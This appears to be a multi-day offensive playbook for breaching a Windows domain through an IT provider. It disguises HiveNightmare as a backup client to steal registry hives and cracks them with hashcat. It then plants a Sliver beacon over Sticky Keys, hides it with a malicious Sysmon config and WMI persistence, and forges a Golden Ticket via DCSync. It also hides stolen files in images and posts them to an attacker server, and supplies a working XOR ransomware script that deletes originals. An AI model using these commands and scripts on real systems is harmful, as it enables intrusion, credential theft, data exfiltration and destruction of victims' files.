Unicode Characters used here for obfuscation (In the Linux Machine's browser hit ctl+shift+u to begin typing Unicode):

MODIFIER LETTER TRIANGULAR COLON (unicode U+02D0) ː

CHARACTER TABULATION (unicode U+0009) 	

I am doing this because both the Space   and the Colon : ASCII Characters in the explorer are replaced with an Undersore _

Without Unicode Characters: 

With Unicode Characters:

From the RDP session window

Drag and drop the folder HelpDesk Service Pack from the remote drive into C:\\Users\\Public.

We have the following in our IT Service Pack folder:

Back-up-Client_v8.7.66.exe (HiveNightmare.exe)

OpenSSH.msi (OpenSSH installer executable)

SysinternalsSuite.zip (Sysinternals to use on the system, includes sysmon)

Run a powershell command to quietly install OpenSSH.msi, make volume shadow copies, and run Back-up-Client_v8.7.66.exe, also verifying the sshd service is running (as ADMINISTRATOR):

cd "C:\Users\Public\HelpDesk Service Pack"
echo "Installing SSH for secure remote sessions"
.\OpenSSH.msi /quiet 
echo "Enable Back-ups for data integrity" 
Enable-ComputerRestore -Drive "C:\" > $null 
vssadmin list shadows 
Checkpoint-Computer -Description "Manual Backup" -RestorePointType "MODIFY_SETTINGS"
set-executionpolicy -executionpolicy bypass -Force 
./Back-up-Client_v8.7.66.exe
echo "See if the new SSH service is running" 
cmd /c "sc query sshd"
echo "HelpDesk completed with '0' errors."

Credential harvesting from Volume Shadow Copies via HiveNightmare 

( IF HIVENIGHTMARE DIDN’T DROP THE FILES) Double click the Back-up-Client_v8.7.66.exe to gather the files needed to retrieve hashes from the system

Navigate to the victim machine’s C:\Users\Public\HelpDesk Service Pack folder

Cut the files, transfer them to our connected drive

ctl + lclick each file

ctl + x to cut the files from that directory

navigate to our connected drive in explorer

ctl + v in the folder to paste the files, taking them off the victim machine and exfiltrating them into our kali workstation

This method seems tedious, but it obfuscates the process with user input that scripts would not normally be able to achieve without heavy tweaking, timing, and jitters.

We will perform the same process as with the IT domain's credential cracking method, we will extract the passwords from the files dropped by HiveNightmare

This will create 3 files which we can then use with impacket to get credentials out of the system.
  	- SAM-YYYY-MM-DD
  	- SECURITY-YYYY-MM-DD
  	- SYSTEM-YYYY-MM-DD

CUT AND PASTE (ctl + x then ctl + v) the 3 files back to our local machine by dragging and dropping them into our remote folder in the RDP session's GUI.

Enable port 22 on the firewall to allow SSH traffic

In the searchbar, search Firewall and click it.

Click Turn windows defender firewall off

make sure all of the firewall options are off.

On Kali Machine, Cracking the Passwords

We'll now go through the files HiveNightmare pulled and see if we can't get any password hashes.

cd "/home/kali/Desktop/tools/Service Pack"
python3 /home/kali/.local/bin/secretsdump.py -sam {SAM FILE} -system {SYSTEM FILE} -security {SECURITY FILE} LOCAL > IT.hash.raw ; cat IT.hash.raw



This should dump the hashes found from HiveNightmare, and we will begin to crack them.

For DCC2 hashes (Domain Cached Credentials 2)

cut -d ":" -f 2 IT.hash.raw | uniq > IT.DCC2
hashcat -m 2100 -a 0 IT.DCC2 /usr/share/wordlists/rockyou.txt -o DCC2.pass.IT --force --potfile-disable; cat DCC2.pass.IT

Trim the hashed passwords to be only unique with your favorite text editor (vi, nano, mousepad, etc)

the only lines should be the hashed passwords.

once this is run through hashcat, you can view the passwords

NTLM (Local hashes)

cut -d ":" -f 4 IT.hash.raw | uniq > IT.NTLM
hashcat -m 1000 -a 0 IT.NTLM /usr/share/wordlists/rockyou.txt -o NTLM.pass.IT --force --potfile-disable; cat NTLM.pass.IT

SSH to the IT machine

On Kali:

ssh <CUSTOMER USER>@<IA IP>

nslookup the Target domain for the next bloodhound target

nslookup orange.lan

Find and Enumerate internal networks

Show existing network routes

route print | more

We are looking for network blocks to begin scanning for hosts that are alive

Ping Sweep the discovered netblocks

Change the below net block of 192.168.0.0/24 to be whatever the actual routes show. If there are no routes, do the same subnet that the previous nslookups gave us.

OUT OF SCOPE IP ADDRESS BLOCKS:

127.0.0.0/8

10.0.0.0/8

224.0.0.0/8

255.255.255.255

0.0.0.0

1..254 | ForEach-Object { $ip="192.168.0.$_"; if ((New-Object Net.NetworkInformation.Ping).Send($ip, 1).Status -eq "Success") { try { "$ip - $([System.Net.Dns]::GetHostEntry($ip).HostName -replace '\.$','')" } catch { "$ip -                     Hostname: Unavailable" } } }

CHANGE THE 3rd OCTET ONCE IT COMPLETES TO ENUMERATE MORE HOSTS ENSURE YOU SWEEP A FEW OF THE 1st-10th (3rd Octet) RANGE OF IPs

This is a pingsweep with a hostname lookup scan. If an ip responds, we now have a target to land on to try more credentials.

Once you feel like you have enumerated enough IP addresses, 

Establishing a Redirector

Setting up redirectors with ssh, we also use the screen command just in case we get disconnected from our session, we also don't accidently send any commands to the wrong IP addresses or tip our hand. This is a tradecraft mechanism. Unfortunately, nmap does not work with dynamic tunnels for some reason. What we can do instead is try another way. We'll do some RDP scanning instead.  To detach from the screen session type Ctrl+A then D. To view screen sessions run screen -ls. To reattach to a detached screen run screen -r <screen session name>.

Create the first SSH tunnel

# in case your terminal quits, the screen command will save it
screen -S IT-Dynamic-SSH
# create a dynamic port forward to use proxychains through
clear;echo "Dynamic Port Forward to IT";ssh <CRACKED USER>@<INITIAL ACCESS IP> -D 9050 -N

On another kali terminal window: More Bloodhound Enumeration

Since at this point we found the DC's IP, we can now do some bloodhound enumeration and add it to our map.

cd /home/kali/Desktop/tools
proxychains bloodhound-python -u <CRACKED USER> -p '<CRACKED PASS>' -d <DOMAIN> -ns <DC IP> -c All --zip

we can now do some enumeration offline and make our strike plan

Connect to next target via RDP through proxychains

proxychains xfreerdp3 /u:'<BULLIT>' /p:'<>' /v:<NEW TARGET IP> /drive:/home/kali/Desktop/tools/Service\ Pack,'Local	Disk	(Cː)'

Drop Tools

Drag and drop the HelpDesk Service Pack folder into C:\\Users\\Public on the victim machine

Drag the sliver agent sethc.exe into the folder

Ensure sysmonconfig-export.xml is in the folder

Install Tools (if you're in admin context)

Run the Java installer

Extract Sysinternals Suite to C:\\Windows\\System32

Rightclick the .zip

Extract

Enter C:\\Windows\\System32 in the filepath location to extract the files into the folder

Privilege Escalation

Close the RDP session

Cracking More Passwords

We'll now go through the files HiveNightmare pulled and see if we can't get any password hashes. 

Ensure you rename the files to the correct names. there should be dates at the end of each of the SAM SYSTEM and SECURITY files.

python3 /home/kali/.local/bin/secretsdump.py -sam SAM- -system SYSTEM- -security SECURITY- LOCAL > hash.raw ; cat hash.raw

This should dump the hashes found from HiveNightmare, and we will begin to crack them. 

For DCC2 hashes (Domain Cached Credentials 2)

cut -d ":" -f 2 hash.raw | uniq > DCC2.hash
hashcat -m 2100 -a 0 DCC2.hash /usr/share/wordlists/rockyou.txt -o DCC2.pass --force --potfile-disable; cat DCC2.pass

once this is run through hashcat, you can view the passwords

If the passwords are not in rockyou.txt, we will have to brute force the passwords

NTLM (Local hashes)

cut -d ":" -f 4 hash.raw | uniq > NTLM.hash
hashcat -m 1000 -a 0 NTLM.hash /usr/share/wordlists/rockyou.txt -o NTLM.pass --force --potfile-disable; cat NTLM.pass

Domain Administrator Credentials gained.

We are now able to use credentials on the domain that we gathered and cracked.

Ensure connectivity is still established

Proxy to the IT service provider

Reconnect to the screen command if it was dropped

screen -ls # this will show the current screens
screen -r <SCREEN_NAME> # if 

Use new credentials to log in to the victim domain

proxychains xfreerdp3 /u:'<% tp.frontmatter.ADM_USER1 %>@<% tp.frontmatter.CUS_SUBD1 %>' /p:'<% tp.frontmatter.ADM_USER1_PASS %>' /v:<% tp.frontmatter.CUS_1 %> /drive:/home/kali/Desktop/tools/Service\ Pack,'Local	Disk	(Cː)'

Drop the HelpDesk Service Pack folder on the new user's Desktop

Ensure our sethc.exe beacon is in the folder

Ensure the sysmonconfig-export.xml file is in the folder

Ensure SysinternalsSuite.zip was fully extracted into C:\\Windows\\System32 if it was not previously

Persistence

There will be 3 methods of persistence,  a hidden dll in C:\\Windows\\System32, WMI Event Subscription, and Sticky Keys.

Encode the powershell Command to change permissions on sethc.exe

On Kali

Using doge64commander.sh encode the following command between 20-30 times and output the file to the Service Pack/HelpDesk Service Pack folder, then run it as administrator on the target machine

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
/home/kali/Desktop/tools/doge64commander.sh ; mv commanded.ps1 sysmonsetup.ps1

#copy and paste this for the command, iterate it at least 15 times
takeown /f "C:\\windows\\System32\\sethc.exe" /a > $null ; icacls.exe C:\\Windows\\System32\\sethc.exe /grant "Everyone:F" > $null ; cd "C:\Users\Public\HelpDesk Service Pack"; Set-ItemProperty -Path C:\\Windows\\System32\\svchost.dll -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) > $null ; copy sethc.exe C:\\Windows\\System32\\sethc.exe -force ; sysmon.exe -i -accepteula ; sysmon.exe -c sysmonconfig-export.xml ; del sethc.exe -force; sysmon.exe -c -- ; del sysmonconfig-export.xml -force ; shutdown /r /t 960

Note: If this does not work, you will need to PSexec this command, just throw psexec.exe -s in front of each of the commands, and re-encode it.

Sticky Keys

Replaces C:\\Windows\\System32\\sethc.exe with Sliver C2 agent executable. This replaces the Sticky Keys binary to our beacon. If you hit shift 5 times after this has been replaced, our beacon will come back.

SYSMON Persistence

Enable the malicious sysmon configuration and drop the C2 agent, and then delete it. Then revert the configuration file.

The configuration file creates an ACL protected archive folder in the C:\\ drive, which only NT AUTHORITY\\SYSTEM has access to.

The configuration file also filters on file deletion events on .exe files, and catches them before they're removed from the system, putting them in the ACL locked folder and renaming them to <sha256_hash>.exe. This creates a well-hidden, protected C2 agent that will be hidden from all scans that do not run in NT AUTHORITY\\SYSTEM context.

Even with admin credentials you get the following:

To access this folder, you MUST be NT AUTHORITY\SYSTEM

Run run.bat script.

If you're able to, run this as an administrator to establish persistence with sethc.exe

Time Based WMI Event Subscription (requires local admin or domain admin, not cross-domain compatible)

.dll beacon

This will run our sliver payload executable within 5 minutes of the machine being powered on:

$FilterArgs = @{name='Accessibility Settings';
				EventNameSpace='root\CimV2';
				QueryLanguage="WQL";
				Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND (TargetInstance.SystemUpTime >= 200) AND (TargetInstance.SystemUptime < 320)";}
$Filter=New-CimInstance -Namespace root\Subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='Accessibility Settings';
				CommandLineTemplate="regsvr32.exe C:\\Windows\\System32\\svchost.dll";}
$Consumer=New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root\Subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

Running from the Sysmon Archive folder

This will run our sliver payload executable if PING.EXE runs for longer than 10s ex: ping localhost -n 15 will execute the payload.

make sure you change the filename of the executable

$FilterArgs = @{name='Performance Monitor';
				EventNameSpace='root\CimV2';
				QueryLanguage="WQL";
				Query="SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name = 'PING.EXE') AND (TargetInstance.UserModeTime >= 10000)";}
$Filter=New-CimInstance -Namespace root\Subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='Performance Monitor';
				CommandLineTemplate="C:\\PerfMon\\3218c2f0314a5fdb20cd7fdb7d1a71e038e1cb092f03efd171f97ae8984c2329.exe";}
$Consumer=New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root\Subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

This creates a log in the Microsoft-Windows-WMI-Activity/Operational log, event ID: 5861

========== DAY 2 ACTIONS ==========

Ping yourself to run the session agent

ping localhost -n 15

Exit the RDP session

Use the sliver session that calls back

# In the sliver-server terminal window, type the first 3 characters of the session that calls back and tab it out
use <SESSIONID>

Going down the rabbit hole

We will now migrate processes to evade detections

Ensure that you use processes that stay open for a long time. For instance, explorer.exe is a bad choice if a user is running it, because users don't often keep the file explorer open very long. Low PID number svchost.exe processes are your friend. lsass.exe is okay as well.

# Enumerate running processes 
ps
# find processes by NT AUTHORITY\SYSTEM until the 3rd process migration.
migrate -p <PID>
migrate -p <PID>

# Migrate into an administrator account if there are any
migrate -p <PID>

Discovery

Network Discovery

Show existing network routes

route print | more

We are looking for network blocks to begin scanning for hosts that are alive. Same as before

Ping Sweep the discovered netblocks

Change the below net block of 10.10.20.0/24 to be whatever the actual routes show. If there are no routes, do the same subnet that the previous nslookups gave us.

1..254 | ForEach-Object { $ip="10.10.20.$_"; if ((New-Object Net.NetworkInformation.Ping).Send($ip, 1).Status -eq "Success") { try { "$ip - $([System.Net.Dns]::GetHostEntry($ip).HostName -replace '\.$','')" } catch { "$ip -                     Hostname: Unavailable" } } }

This is a pingsweep with a hostname lookup scan. If an ip responds, we now have a target to land on to try more credentials.

========== DAY 3 ACTIONS ==========

Lateral Movement

Golden Ticket Attack

Sources: 

https://yojimbosecurity.ninja/golden-ticket/  

https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden 

We require 3 things to create the golden ticket

krbtgt NT Hash

Domain

Domain SID

secretsdump.py - DCSync to retrieve krbtgt hashes

This performs a DCSync attack to the domain controller in our current domain to retrieve all the password hashes in the domain.

We can poke around in bloodhound to determine what users have DCSync Rights

With this account we perform the DCSync

proxychains python3 /home/kali/.local/bin/secretsdump.py <% tp.frontmatter.CUS_SUBD1 %>/<USERNAME>:'<PASSWORD>'@<DC_HOSTNAME>.<% tp.frontmatter.CUS_SUBD1 %> > <% tp.frontmatter.CUS_SUBD1 %>.secrets
cat <% tp.frontmatter.CUS_SUBD1 %>.secrets | grep krbtgt | grep :::

You will get all of the password hashes for users within the domain

lookupsid.py - retrieve domain SID

proxychains python3 /home/kali/.local/bin/lookupsid.py <% tp.frontmatter.CUS_SUBD1 %>/<USERNAME>:'<PASSWORD>'@<DC_HOSTNAME>.<% tp.frontmatter.CUS_SUBD1 %> > <% tp.frontmatter.CUS_SUBD1 %>.SID
cat <% tp.frontmatter.CUS_SUBD1 %>.SID | grep "Domain SID"

Create the golden ticket

ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <% tp.frontmatter.CUS_SUBD1 %> golden

Export the golden ticket so you can use it

export KRB5CCNAME=$(pwd)/golden.ccache

Using the Golden Ticket

proxychains python3 /home/kali/.local/bin/psexec.py -dc-ip 10.10.20.8 -target-ip 10.10.20.8 -no-pass -k hr.customer.net/golden@hr-dc.hr.customer.net

this creates a kerberos authentication ticket that we can use to run remote commands with psexec.py. 

Exfiltration

Stage data in a folder in the user's documents folder, zip into an archive, steg the .zip into an image, and upload the stegged image using raven

Establish the Raven Server

Identify Proxy Candidates

Stand up the Redirectors

Stand up the Raven Server (with https if possible)

Drop into a Sliver Session Shell

If your previous session Closed:

If your previous session closed, we will use our beacon to generate a session. This keeps our beacons hidden and less interesting longer, also following good tradecraft by delegating our longer haul agent beacons to create short haul agent sessions. Always delegate down the chain, not up.

# in sliver-server, show current beacons
beacons
use <BEACONID>
execute ping.exe localhost -n 15

A session should reach back to us that we can use

Migrate processes once more

Ensure that you use processes that stay there for a long time, for instance, Explorer.exe is a bad choice if a user is running it, because users don't often keep the file explorer open very long. Low PID number svchost.exe processes are your friend. lsass.exe is okay as well.
```
# in sliver-server
use <SESSIONID>
ps
migrate -p <PID>
migrate -p <PID>
migrate -p <PID>
```
Enumerate all user generated files
```
# Enumerate Non-Native Files on a Windows Machine
# Output: C:\files.txt 
# Excludes files in Windows-native folders, including specific native folders in Program Files
# Includes third-party files in Program Files (e.g., Mozilla Firefox)
# Compatible with PowerShell 5.1

# Define output file
$OutputFile = "C:\Users\Public\Documents\files.txt"
$Log = @()

# Define system paths to exclude entirely
$SystemPaths = @(
    "C:\Windows\*",
    "C:\ProgramData\*",
    "C:\Users\*\AppData\Local\Microsoft\*",
    "C:\Users\*\AppData\Roaming\Microsoft\*"
)

# Define Windows-native folders in C:\Program Files and C:\Program Files (x86)
$NativeProgramFilesFolders = @(
    "Common Files",
    "Internet Explorer",
    "Microsoft",
    "Microsoft Office",
    "Microsoft Office 15",
    "Microsoft Office 16",
    "Microsoft.NET",
    "MSBuild",
    "Reference Assemblies",
    "Windows Defender*",
    "Windows Mail",
    "Windows Media Player*",
    "Windows Multimedia Platform",
    "Windows NT",
    "Windows Photo Viewer",
    "Windows Portable Devices*",
    "WindowsPowerShell*",
    "Windows Security"
)

# Define drives to scan (default: C:\, adjust as needed)
$Drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -like "*:\" }

foreach ($Drive in $Drives) {
    Write-Host "Scanning drive: $($Drive.Root)"
    try {
        # Get all files, excluding system paths and native Program Files folders
        $Files = Get-ChildItem -Path $Drive.Root -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object {
                $FullPath = $_.FullName
                # Exclude files in system paths
                $isSystemPath = $false
                foreach ($Path in $SystemPaths) {
                    if ($FullPath -like $Path) {
                        $isSystemPath = $true
                        break
                    }
                }
                if ($isSystemPath) { return $false }

                # Check if file is in Program Files or Program Files (x86)
                if ($FullPath -like "C:\Program Files\*" -or $FullPath -like "C:\Program Files (x86)\*") {
                    # Extract the top-level folder under Program Files
                    $pathParts = $FullPath -split '\\'
                    if ($pathParts.Count -gt 3) {
                        $topLevelFolder = $pathParts[3] # e.g., "Mozilla Firefox" or "Microsoft"
                        if ($NativeProgramFilesFolders -contains $topLevelFolder) {
                            return $false # Exclude native folder
                        }
                    }
                }
                return $true # Include non-native files
            }

        foreach ($File in $Files) {
            try {
                # Optionally check for Microsoft signature (uncomment to enable)
                # $Signature = Get-AuthenticodeSignature -FilePath $File.FullName -ErrorAction SilentlyContinue
                # if ($Signature -and $Signature.Status -eq "Valid" -and $Signature.SignerCertificate.Subject -like "*Microsoft*") {
                #     continue # Skip Microsoft-signed files
                # }

                # Collect file path
                $Log += $File.FullName
            }
            catch {
                Write-Warning "Error processing file: $($File.FullName) - $_"
            }
        }
    }
    catch {
        Write-Warning "Error scanning drive: $($Drive.Root) - $_"
    }
}

# Save only file paths to output file
$Log | Out-File -FilePath $OutputFile -Encoding UTF8

# Display summary in console
Write-Host "Enumeration complete. Results saved to: $OutputFile"
$LogCount = $Log.Count
Write-Host "Found $LogCount non-native files."

# Optional: Display a sample of results in console (first 5 paths)
if ($LogCount -gt 0) {
    Write-Host "Sample of non-native file paths (first 5):"
    $Log | Select-Object -First 5 | ForEach-Object { Write-Host $_ }
}
```
Locate Important Files and Stage Them
```
Get-Content C:\users\Public\Documents\files.txt | Where-Object { $_ -match '\.(pdf|xlsx?|docx?|txt|rtf|odt|ods|odp|csv|md|pptx?|pub|vsdx?|accdb|one|msg|eml|dotx?|xltx?|potx?|ppsx?|sldx?|thmx|xml|wps|wpd|tex|log|pages|numbers|key|epub|azw3|mobi|djvu|fb2|lrf|chm|hwp|sxw|sxi|stw|stc|sti|std|sxg|sxd|abw|kwd|kwt|123|wk1|wk3|wk4|wks|qpw|xlw|xlr|dif|slk|sylk|wb2|wb3|qpw|nb|ole|ole2|wk4|wks|frm|frx|mda|mdt|mdw|mde|adt|adp|mad|maf|mag|mam|maq|mar|mas|mat|mda|mdb|mde|mdt|mdw|prg|scx|sct|vcx|db2|db3|dbc|dbf|dbt|dbx|dcx|fpt|frx|idx|mbx|mdx|mem|mkd|ntx|prg|ptx|qbe|qbs|qry|sdf|sql|tab|tmd|val|wdb|xdb|adn|mad|maf|mam|maq|mar|mas|mat|ini|conf|cfg|config|yaml|yml|json|toml|properties|env|props|settings|rc|bashrc|zshrc|profile|gitconfig|gitignore|htaccess|nginx\.conf|apache2?\.conf|httpd\.conf|hosts|xml|plist|reg|bat|cmd|ps1|sh|bash|zsh|ksh|csh|fish|ion)$' } | ForEach-Object { if (Test-Path $_) { $_ } } | Compress-Archive -CompressionLevel Optimal -DestinationPath "C:\Users\Public\Documents\Archive_$(Get-NetIPAddress | Where-Object InterfaceAlias -eq Ethernet0 | Where-Object AddressFamily -eq IPV4 | Select-Object -ExpandProperty IPAddress).zip" -Force
```

Steganography to obfuscate the target files
```
java -Xmx6g -jar "C:\Users\Public\HelpDesk" embed -a RandomLSB -mf "stegtest.txt" -cf "Wallpaper Engine/thomas-bonometti-mx6BzzKvWIw-unsplash.jpg" -sf hidden.png -e -p MWMzRjRuZ0IzNzczclRoNG5TNDU1eVA0bmQ0 -A AES128
```


Send the files to the Raven Server
```
function Invoke-SendRaven {
    param (
        [string]$Uri,
        [string]$FilePath
    )

    # Target File
    $File = Get-Item $FilePath
    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    $Boundary = [System.Guid]::NewGuid().ToString()

    # Request Headers
    $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $Headers.Add("Content-Type", "multipart/form-data; boundary=$Boundary")

    # Create the request
    $Request = [System.Net.WebRequest]::Create($Uri)
    $Request.Method = "POST"
    $Request.ContentType = "multipart/form-data; boundary=$Boundary"

    # Request Body
    $Stream = $Request.GetRequestStream()
    $Encoding = [System.Text.Encoding]::ASCII

    $Stream.Write($Encoding.GetBytes("--$Boundary`r`n"), 0, ("--$Boundary`r`n").Length)
    $Stream.Write($Encoding.GetBytes("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n"), 0, ("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n").Length)
    $Stream.Write($Encoding.GetBytes("Content-Type: application/octet-stream`r`n`r`n"), 0, ("Content-Type: application/octet-stream`r`n`r`n").Length)
    $Stream.Write($Content, 0, $Content.Length)
    $Stream.Write($Encoding.GetBytes("`r`n--$Boundary--`r`n"), 0, ("`r`n--$Boundary--`r`n").Length)
    $Stream.Close()

    # Upload File
    $Response = $Request.GetResponse()
    $Response.Close()
}
```
# Usage
Invoke-SendRaven -Uri <http://192.168.0.12:4443/> -FilePath C:\users\public\documents\cute_bear_.png

========== DAY 4 ACTIONS ==========

Impact

We will apply the malware to the system as a GPO if possible.

Powershell Ransomware Script (XOR byte-for-byte encryption with a key)

This script reads a file and performs a byte-for-byte XOR encryption with a key

# PowerShell Script to XOR or Reverse XOR Multiple Files from a List of File Paths
# Deletes original file after XORing in normal mode
# In normal mode, replaces file extension with .fun (e.g., file1.txt -> file1.fun)
# In reverse mode, restores original file name and extension from log file
# Usage: .\xor_file.ps1 -InputList <list_path> -Key <key> [-Reverse]
# Example (XOR): .\xor_file.ps1 -InputList C:\file_list.txt -Key secret
# Example (Reverse): .\xor_file.ps1 -InputList C:\fun_list.txt -Key secret -Reverse
# Input list format: One file path per line (e.g., C:\input1.txt or C:\input1.fun)
# Compatible with PowerShell 5.1

param (
    [Parameter(Mandatory=$true)]
    [string]$InputList,

    [Parameter(Mandatory=$true)]
    [string]$Key,

    [switch]$Reverse
)

# Function to XOR a byte array with a key
function XOR-Bytes {
    param (
        [byte[]]$Data,
        [byte[]]$Key
    )
    $Result = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    return $Result
}

try {
    # Validate input list file exists
    if (-not (Test-Path $InputList)) {
        throw "Input list file not found: $InputList"
    }

    # Convert key to bytes
    $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    if ($KeyBytes.Length -eq 0) {
        throw "Key cannot be empty"
    }

    # Read file paths from input list
    $FilePaths = Get-Content -Path $InputList -ErrorAction Stop | Where-Object { $_ -match '\S' } | ForEach-Object { $_.Trim() }

    if ($FilePaths.Count -eq 0) {
        throw "Input list is empty or contains no valid file paths"
    }

    # Determine mode for display
    $Mode = if ($Reverse) { 'Reverse' } else { 'XOR' }
    Write-Host "Processing $($FilePaths.Count) file(s) from $InputList (Mode: $Mode)"

    # Derive log file path from input list
    $LogFile = [System.IO.Path]::ChangeExtension($InputList, ".log")

    # Process each file
    $Results = @()
    foreach ($InputFile in $FilePaths) {
        try {
            # Validate input file exists
            if (-not (Test-Path $InputFile)) {
                Write-Warning "Skipping file (not found): $InputFile"
                $Results += [PSCustomObject]@{
                    InputFile = $InputFile
                    OutputFile = $null
                    Status = "Failed: File not found"
                    DeleteStatus = "N/A"
                }
                continue
            }

            # Determine output file path
            $OutputFile = if ($Reverse) {
                # In reverse mode, look up original file name in log file
                if ($InputFile -notlike "*.fun") {
                    Write-Warning "Skipping file (not .fun in Reverse mode): $InputFile"
                    $Results += [PSCustomObject]@{
                        InputFile = $InputFile
                        OutputFile = $null
                        Status = "Failed: Not a .fun file"
                        DeleteStatus = "N/A"
                    }
                    continue
                }

                # Check if log file exists
                if (-not (Test-Path $LogFile)) {
                    Write-Warning "Log file not found: $LogFile. Using default name for $InputFile"
                    $InputFile -replace '\.fun$', ''
                    continue
                }

                # Parse log file to find original file name
                $logContent = Get-Content -Path $LogFile -Raw
                $originalFile = $null
                # Match lines like: C:\path\to\file.txt    C:\path\to\file.fun    Success    Deleted
                if ($logContent -match [regex]::Escape($InputFile) -and $logContent -match 'Success') {
                    $lines = $logContent -split "`n"
                    foreach ($line in $lines) {
                        if ($line -match [regex]::Escape($InputFile) -and $line -match 'Success') {
                            # Split line by whitespace, assuming InputFile is first column
                            $columns = $line -split '\s+', 4
                            if ($columns.Count -ge 4 -and $columns[1] -eq $InputFile) {
                                $originalFile = $columns[0]
                                break
                            }
                        }
                    }
                }

                if ($originalFile -and (Test-Path $originalFile)) {
                    Write-Warning "Original file already exists: $originalFile. Using default name for $InputFile"
                    $InputFile -replace '\.fun$', ''
                }
                elseif ($originalFile) {
                    $originalFile
                }
                else {
                    Write-Warning "No matching log entry found for $InputFile. Using default name"
                    $InputFile -replace '\.fun$', ''
                }
            } else {
                # In normal mode, replace extension with .fun
                $InputFile -replace '\.[^\.]+$', '.fun'
            }

            # Validate input file extension for normal mode
            if (-not $Reverse -and $InputFile -like "*.fun") {
                Write-Warning "Skipping file (.fun in XOR mode): $InputFile"
                $Results += [PSCustomObject]@{
                    InputFile = $InputFile
                    OutputFile = $null
                    Status = "Failed: Already a .fun file"
                    DeleteStatus = "N/A"
                }
                continue
            }

            # Read input file as bytes
            $InputBytes = [System.IO.File]::ReadAllBytes($InputFile)

            # Perform XOR operation (same for both modes, as XOR is reversible)
            $XoredBytes = XOR-Bytes -Data $InputBytes -Key $KeyBytes

            # Write output to file
            [System.IO.File]::WriteAllBytes($OutputFile, $XoredBytes)

            # In normal mode, delete the original input file after successful output
            $DeleteStatus = "N/A"
            if (-not $Reverse) {
                try {
                    Remove-Item -Path $InputFile -Force -ErrorAction Stop
                    $DeleteStatus = "Deleted"
                    Write-Host "Deleted original file: $InputFile"
                }
                catch {
                    $DeleteStatus = "Failed to delete: $_"
                    Write-Warning "Failed to delete original file: $InputFile - $_"
                }
            }

            Write-Host "Successfully processed: $InputFile -> $OutputFile"
            $Results += [PSCustomObject]@{
                InputFile = $InputFile
                OutputFile = $OutputFile
                Status = "Success"
                DeleteStatus = $DeleteStatus
            }
        }
        catch {
            Write-Warning "Error processing file: $InputFile - $_"
            $Results += [PSCustomObject]@{
                InputFile = $InputFile
                OutputFile = $null
                Status = "Failed: $_"
                DeleteStatus = "N/A"
            }
        }
    }

    # Save summary to a log file
    $LogFile = [System.IO.Path]::ChangeExtension($InputList, ".log")
    $Results | Format-Table -AutoSize | Out-File -FilePath $LogFile -Encoding UTF8

    Write-Host "Processing complete. Summary saved to: $LogFile"
    Write-Host "Successful: $($Results.Where({ $_.Status -eq 'Success' }).Count) file(s)"
    Write-Host "Failed: $($Results.Where({ $_.Status -like 'Failed*' }).Count) file(s)"
}
catch {
    Write-Error "Error: $_"
    exit 1
}
